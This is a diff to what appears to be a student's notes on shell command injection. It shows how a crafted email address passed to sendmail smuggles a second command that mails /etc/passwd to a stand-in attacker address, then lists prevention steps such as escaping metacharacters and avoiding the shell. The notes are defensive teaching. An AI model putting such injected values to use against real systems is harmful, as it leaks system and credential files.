@@ -376,10 +376,36 @@ Shell understand a large set of metacharachters, and as we know this causes majo
 
   This will run a command that deletes the whole file system!
 - Piping the commands </br>
+  In an UNIX based operating system there is a file called /etc/passwd. This file contains information on all users on the system, including a hashed represantation of their passwords. </br>
+  Take an example where a script sends a E-mail to a user. The email service called sendmail sends the email by piping the contents of the mail trough the program. In the script, a recipient address is required. (see image below)</br>
+ 
+  ![sendmail](https://user-images.githubusercontent.com/24454699/56131922-4af81f80-5f78-11e9-8274-776fb9332987.png)
+  </br>
+  If an attacker registers an email adress like this : foo@bar.example; mail badguy@badguy.example < /etc/passwd it will include it as statement in the executed command. (see image below)</br>
 
-
+  ![sendmailshellattack](https://user-images.githubusercontent.com/24454699/56132116-b2ae6a80-5f78-11e9-985a-754b5ce63ae4.png)
+  </br>
 
 ### PREVENT SHELL COMMAND INJECTIONS
+There are certain steps that need to be taken to prevent a shell command injection from happening: 
+- Identify when the shell is being used.
+  First you have to Identify the functions in your programming Language that pass data to a command shell, or the ways to invoke it. some examples of these functions are shown in the image below. </br>
+
+  ![commandexample](https://user-images.githubusercontent.com/24454699/56132467-93640d00-5f79-11e9-9a36-d0ce2c7143e4.png)
+  </br>
+
+- Handling and disarming the shell metacharachters.
+  Each shell has different metacharachters and how they are used differs aswell. Take for example the metacharachters in BASH ( Bourne Again Shell). see image below </br>
+
+  ![metabash](https://user-images.githubusercontent.com/24454699/56132580-e047e380-5f79-11e9-86f1-cd0764a1ce34.png)
+  </br>
+
+  You could solve the problem in the same way as we did with the SQL Injections, by escaping the metacharachters. (recap that if needed)
+- Avoiding user input in the command arguments.
+- Managing without the shell. (not making use of the shell)
+
+
+
 
 ## USER INPUT
 
